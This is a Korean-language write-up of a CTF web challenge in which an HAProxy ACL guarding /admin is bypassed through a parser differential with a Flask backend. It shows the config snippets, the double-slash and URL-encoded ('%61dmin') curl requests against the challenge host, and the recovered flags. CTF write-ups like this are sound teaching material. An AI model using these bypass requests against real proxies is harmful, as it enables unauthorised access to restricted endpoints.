---
title: "[Web] Borderline Personality"
description: Writeup for "Borderline Personality" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Web]
toc: true
comments: false
---

# Borderline Personality (EHAX CTF 2026)

---

- **Name:** Borderline Personality
- **Category:** Web
- **Description:** The proxy thinks it's in control. The backend thinks it's safe. Find the space between their lies and slip through.
- **Connection:** `http://chall.ehax.in:9098`
- **Flag format:** `EHAX{...}` / `EH4X{...}`

---

### 개요

HAProxy 앞에 Flask 백엔드가 있는 구조입니다.

```
인터넷 → HAProxy :9098 (ACL 검사) → Flask :5000 (플래그)
```

플래그는 `/admin/flag`에 있고,
HAProxy가 `/admin` 경로를 전부 차단합니다.

문제 설명이 힌트를 줍니다.

> "The proxy thinks it's in control. The backend thinks it's safe.
> Find the space between their lies and slip through."

프록시와 백엔드 사이의 **해석 차이**를 찾으면 됩니다.

---

### 소스 분석

#### haproxy.cfg (v1) — 첫 번째 ACL

```
acl restricted_path path_beg /admin
http-request deny if restricted_path
```

`path_beg`는 경로가 `/admin`으로 시작하면 차단합니다.
`//admin/flag`는 어떨까요?

`//admin`은 `/admin`으로 시작하지 않습니다.
HAProxy는 raw 경로를 그대로 비교하기 때문에 통과됩니다.

Flask/Werkzeug는 `//admin/flag`를 `/admin/flag`로
**정규화**한 뒤 라우팅합니다.

#### haproxy.cfg (v2) — 패치된 ACL

v1이 막히자 정규식으로 패치되었습니다.

```
acl restricted_path path -m reg ^/+admin
http-request deny if restricted_path
```

`^/+admin`은 `/`가 하나 이상 붙은 `admin`을 차단합니다.
`//admin`도 이제 막힙니다.

그런데 URL 인코딩은 여전히 처리하지 않습니다.
`%61`은 `a`의 URL 인코딩입니다.

`/%61dmin/flag`는 정규식 `^/+admin`에 매칭되지 않아 통과되고,
Flask는 `%61`을 `a`로 디코딩해서 `/admin/flag`로 라우팅합니다.

---

### 취약점 분석

프록시와 Flask가 같은 URL을 다르게 해석합니다.

| 요청 경로 | HAProxy | Flask | 결과 |
|---|---|---|---|
| `/admin/flag` | `/admin` 시작 → 차단 | `/admin/flag` | ❌ |
| `//admin/flag` | `//admin` ≠ `/admin` → 통과 | 정규화 → `/admin/flag` | ✅ (v1) |
| `/%61dmin/flag` | `^/+admin` 불일치 → 통과 | `%61`→`a` → `/admin/flag` | ✅ (v2) |

HAProxy는 raw 문자열로 비교하고,
Flask는 정규화 및 디코딩 후 라우팅합니다.
이 간극이 두 버전 모두에서 우회 경로가 됩니다.

---

### Exploit 실행 과정

**v1 — 이중 슬래시**

```bash
curl --path-as-is "http://chall.ehax.in:9098//admin/flag"
```

`--path-as-is` 옵션이 필요합니다.
curl은 기본적으로 `//`를 `/`로 정규화하기 때문입니다.

**v2 — URL 인코딩**

```bash
curl "http://chall.ehax.in:9098/%61dmin/flag"
```

실행 결과:

```
Flag 1: EHAX{7H3R3_3XI$7$_ILL3G4L_W4Y$_T0_4CC3SS_UNR3$7RIS$3D_$7UFF}
Flag 2: EH4X{BYP4SSING_R3QU3S7S_7HR0UGH_SMUGGLING__IS_H4RD}
```

---

### FLAG

```
EHAX{7H3R3_3XI$7$_ILL3G4L_W4Y$_T0_4CC3SS_UNR3$7RIS$3D_$7UFF}
EH4X{BYP4SSING_R3QU3S7S_7HR0UGH_SMUGGLING__IS_H4RD}
```

---

### 요약

이 문제의 핵심은 **Parser Differential**입니다.

HAProxy는 경로를 raw 문자열로 검사하고,
Flask는 정규화와 디코딩을 거쳐 라우팅합니다.
같은 URL을 다르게 해석하는 순간, 필터는 우회됩니다.

v1은 이중 슬래시(`//`)로,
v2는 URL 인코딩(`%61`)으로 각각 간극을 파고들었습니다.

보안 검사는 반드시 백엔드와 **동일한 파싱 과정**을 거친 뒤 수행해야 합니다.
